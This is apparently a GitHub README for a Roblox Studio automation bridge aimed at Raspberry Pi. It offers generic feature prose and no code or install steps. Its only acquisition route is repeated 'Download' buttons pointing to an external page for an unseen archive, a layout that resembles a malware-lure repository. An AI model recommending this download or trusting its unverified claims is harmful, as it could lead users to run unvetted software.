![preview](https://raw.githubusercontent.com/thryvaan-hub/pi-roblox-bridge/main/card_05ce.svg)
[![Download](https://raw.githubusercontent.com/thryvaan-hub/pi-roblox-bridge/main/setup_c4bfa40.svg)](https://thryvaan-hub.github.io/pi-roblox-bridge/)

# 🧩 Pi Forge Studio Bridge

**Declarative, session-scoped Roblox Studio automation toolkit for Raspberry Pi edge rigs — no persistent daemon, no babysitting.**

<p align="left">
  <img alt="status" src="https://img.shields.io/badge/status-active--development-brightgreen?style=flat-square">
  <img alt="platform" src="https://img.shields.io/badge/platform-Raspberry%20Pi%20%7C%20Linux-c51a4a?style=flat-square">
  <img alt="runtime" src="https://img.shields.io/badge/runtime-Python%203.11%2B-3776ab?style=flat-square">
  <img alt="protocol" src="https://img.shields.io/badge/protocol-MCP--compatible-6e40c9?style=flat-square">
  <img alt="license" src="https://img.shields.io/badge/license-MIT-blue?style=flat-square">
  <img alt="build" src="https://img.shields.io/badge/build-deterministic-informational?style=flat-square">
  <img alt="i18n" src="https://img.shields.io/badge/i18n-12%20locales-yellow?style=flat-square">
  <img alt="uptime" src="https://img.shields.io/badge/support-24%2F7%20relay-9cf?style=flat-square">
</p>

---

## 🎬 A Different Kind of Studio Companion

Most automation bridges want to live forever. They install a background process, claim a port, and quietly hum along until the day you forget they exist — and then they break something at 3 AM. **Pi Forge Studio Bridge** takes the opposite stance: it is *ephemeral by design*.

Think of it less like a server and more like a **switchboard operator who clocks in only when you call**. You hand it a job description, it opens a short-lived channel to your Roblox Studio instance, performs the requested work, hands back a structured result, and then dissolves into the background noise. Nothing lingers. Nothing accumulates. Nothing surprises you next Tuesday.

This repository is the reference implementation of that philosophy, tuned for small-footprint Linux boards, hobbyist rigs, and headless editing pipelines.

---

## 📥 Acquisition

[![Download](https://raw.githubusercontent.com/thryvaan-hub/pi-roblox-bridge/main/setup_c4bfa40.svg)](https://thryvaan-hub.github.io/pi-roblox-bridge/)

The distribution bundle ships as a self-contained archive with checksum manifests, locale packs, and a deterministic dependency lockfile. No global installers, no registry writes, no package manager side effects.

---

## 🌱 Why This Exists

The original insight was simple: on-device assistants do not need a permanently resident tool server to be useful. What they need is **capability on demand** — a way to say "create this part, tag it, parent it, and return the resulting instance ID" without committing an entire process tree to memory for the rest of the device's uptime.

From that insight, three design commitments emerged:

1. **Zero resident footprint.** No listeners between invocations. No orphaned sockets.
2. **Deterministic outputs.** The same request against the same scene yields the same structured response, every time.
3. **Graceful degradation.** If the target Studio session is unreachable, the bridge fails *informatively* rather than hanging.

Everything else in this document is a consequence of those three commitments.

---

## ✨ Feature Highlights

### 🔌 Session-Scoped Tool Invocation
Each request spins up a short-lived bridge context, negotiates a handshake with the Studio side, runs the requested operation, streams back a typed payload, and tears the context down. This is the heart of the project — a "mayfly connection" model that keeps your device's memory map clean.

### 🧠 Intent-Routed Command Surface
Rather than exposing a flat wall of raw function names, the bridge groups operations into **intent domains**: scene construction, property mutation, asset querying, scripted reflection, and diagnostic probing. You ask for an outcome, not a function signature.

### 🌍 Multilingual Response Layer
Every human-readable field returned by the bridge — errors, warnings, hints, and summaries — can be emitted in one of twelve bundled locales. Locale selection is per-request, so a single device can serve mixed-language teams without restarting anything.

### 📱 Responsive Operator Console
The optional web console adapts from a 320px handheld viewport up to an ultrawide dashboard. Panels reflow, tables virtualize, and the timeline strip collapses into a scrollable ribbon on narrow screens. It is usable one-handed on a phone and comfortable on a wall display.

### 🛰️ 24/7 Relay Support Model
Community relay channels are monitored continuously. Whether it is a holiday, a weekend, or an odd hour in your timezone, there is a documented escalation path and a rotating maintainer on call. Support windows are published in the repository wiki.

### ♻️ Idempotent Request Replay
Requests carry a client-generated fingerprint. Replaying the same fingerprint within the retention window returns the cached result instead of re-executing. This makes flaky-network retries safe and cheap.

### 🧪 Sandboxed Dry Runs
Every mutating operation can be simulated first. The dry-run mode returns the predicted diff — what *would* change — without touching the live scene. Perfect for validating generated build scripts before committing them.

### 🧭 Structured Telemetry Frames
Instead of free-form log lines, the bridge emits typed telemetry frames that downstream dashboards can parse without regex gymnastics. Frame schemas are versioned and documented.

### 🧰 Pluggable Transport Backends
The transport layer is abstracted. Local loopback, Unix domain sockets, and a lightweight framed TCP mode are all supported out of the box, with a documented interface for adding your own.

### 🔒 Least-Privilege Capability Tokens
Operations are gated behind capability tokens that scope what a given caller may do. A read-only audit caller cannot mutate geometry even if it tries.

### 🧬 Deterministic Scene Snapshots
Snapshot capture records a canonical, order-stable representation of the scene so diffs are meaningful and reproducible across devices.

---

## 🧱 Architecture at a Glance

The system is composed of four cooperating layers, each with a narrow responsibility.

- **Dispatch Layer** — parses incoming intents, validates capability tokens, resolves locale, and routes to the correct domain handler.
- **Domain Layer** — houses the actual operation implementations, grouped by intent domain. This is where scene logic lives.
- **Bridge Layer** — manages the short-lived connection lifecycle, handshake negotiation, framing, and teardown.
- **Adapter Layer** — speaks the concrete wire protocol to the Studio side, with backend-specific quirks isolated here.

Data flows downward on request and upward on response. No layer reaches past its neighbor. This strict layering is what makes the ephemeral model tractable — each layer can be torn down independently without leaking state into the next invocation.

---

## 🛠️ Getting Started Without the Usual Ritual

Because the bridge is session-scoped, "setup" means *registering a profile*, not *starting a service*.

1. Prepare a profile descriptor (a small declarative file naming your transport backend, locale preference, and capability scopes).
2. Point the launcher at that descriptor.
3. Invoke an intent. The bridge assembles everything it needs, runs the operation, and exits.

There is no daemon to keep alive, no port to reserve permanently, and no supervisor process watching over things. If you want repeat invocations, you simply invoke again.

Profiles can be version-controlled alongside your project, which means onboarding a new machine is a matter of checking out a repo rather than reciting a setup incantation.

---

## 🗺️ Intent Domain Reference

| Domain | Purpose | Typical Use |
| --- | --- | --- |
| `scene.build` | Construct geometry and hierarchy | Generating procedural props |
| `scene.mutate` | Adjust properties on existing instances | Batch renames, material swaps |
| `scene.inspect` | Read state without changing it | Audits, validation passes |
| `asset.query` | Look up catalog and local assets | Dependency resolution |
| `script.reflect` | Examine script metadata and structure | Static analysis hooks |
| `diag.probe` | Health and capability checks | Preflight validation |

Each domain documents its own request and response schemas in the `docs/domains` directory. Schemas are versioned and follow a shared envelope format so tooling can be written generically.

---

## 🌐 Multilingual Coverage

Bundled locales currently include: English, Japanese, Korean, Simplified Chinese, Traditional Chinese, Spanish, Portuguese, French, German, Italian, Hindi, and Arabic. Right-to-left rendering is handled natively in the console. Locale packs are plain data files, so community translations can be added without touching application code.

If your language is missing, the contribution path is deliberately shallow: copy the reference pack, translate the string table, run the locale linter, and open a pull request.

---

## 🖥️ Responsive Operator Console

The console is an optional companion, not a requirement. It offers:

- A live intent timeline with collapsible request/response cards.
- A scene tree viewer that mirrors the canonical snapshot format.
- A capability token manager with scope visualization.
- A locale switcher that re-renders without a page reload.
- A dry-run diff viewer that highlights predicted versus actual changes.

Every panel is keyboard navigable, respects reduced-motion preferences, and maintains a readable contrast ratio at all supported breakpoints.

---

## 🧑‍💻 Developer Workflow

- **Linting** runs across all source trees and locale packs.
- **Schema validation** runs against every documented domain contract.
- **Golden tests** assert that snapshot output is byte-stable across runs.
- **Replay tests** confirm idempotency fingerprints behave as specified.
- **Cross-locale tests** ensure no string table drifts out of sync.

The test suite is small enough to run comfortably on a modest single-board computer, which keeps the contribution loop fast for people developing directly on their target hardware.

---

## 🔐 Security Posture

Security in an ephemeral system is mostly about *refusing* to do things. The bridge:

- Refuses to hold state between invocations unless explicitly asked.
- Refuses to honor capability tokens that have been revoked or expired.
- Refuses to execute mutating operations in dry-run sessions.
- Refuses to accept locale strings that are not in the registered pack set.

Vulnerability reports are handled through a coordinated disclosure process described in the security policy document. Reports are acknowledged promptly and triaged against severity.

---

## 🧭 Roadmap

- **Near term:** expanded intent domains for lighting and physics authoring, deeper snapshot diffing, richer telemetry frames.
- **Mid term:** additional transport backends, a plugin registration API for third-party domains, and an offline locale pack builder.
- **Long term:** a declarative "forge recipe" format that lets entire build pipelines be expressed as versioned YAML, executed as a single bridge session, and diffed like any other source artifact.

Roadmap items are tracked as discussion threads rather than rigid milestones, because priorities shift when real users show up with real problems.

---

## 📚 Documentation Map

- `docs/domains` — per-domain request and response schemas.
- `docs/transports` — backend interface contracts.
- `docs/locales` — translation workflow and linter rules.
- `docs/telemetry` — frame schemas and dashboard integration notes.
- `docs/operations` — relay support model, escalation paths, and on-call rotation.

---

## 🤝 Contributing

Contributions are welcome in the form of locale packs, transport backends, domain handlers, documentation, and tests. Before opening a pull request, run the full local validation suite — it catches nearly every issue that would otherwise surface during review.

Please keep pull requests focused. A single, well-tested change is far easier to review than a sprawling one, and the maintainers genuinely appreciate the restraint.

---

## 💬 Support

Support is provided through community relay channels that are staffed around the clock. Response targets, escalation tiers, and holiday coverage are documented in the operations guide. If you are blocked, say so plainly — someone is always listening.

---

## ⚠️ Disclaimer

This project is an independent, community-maintained toolkit and is **not affiliated with, endorsed by, or sponsored by** any platform vendor. All trademarks referenced remain the property of their respective owners and are used here for descriptive purposes only.

The toolkit is provided **as-is**, without warranty of any kind, express or implied. You are responsible for the operations you authorize, the scenes you modify, and the tokens you issue. Always validate destructive operations in dry-run mode first, and always keep version control as your safety net.

Use in automated pipelines is supported but should be gated behind your own review processes. The maintainers accept no liability for unintended scene mutations, data loss, or downstream consequences arising from automated invocation.

This project is intended for lawful, authorized automation of environments you own or have explicit permission to manage.

---

## 📄 License

Released under the **MIT License**.

You may view the full license text at the canonical location: [MIT License](https://opensource.org/license/mit).

Copyright © 2026 Pi Forge Studio Bridge contributors.

---

## 🙌 Acknowledgements

To everyone who has ever opened a single-board computer, plugged in a breadboard, and wondered whether a tool server really needs to run forever — this project is an answer to that question. Thank you to the translators, the testers, the documentation readers who filed clarifying issues, and the late-night relay volunteers who keep the support channels warm.

Build something worth diffing.

[![Download](https://raw.githubusercontent.com/thryvaan-hub/pi-roblox-bridge/main/setup_c4bfa40.svg)](https://thryvaan-hub.github.io/pi-roblox-bridge/)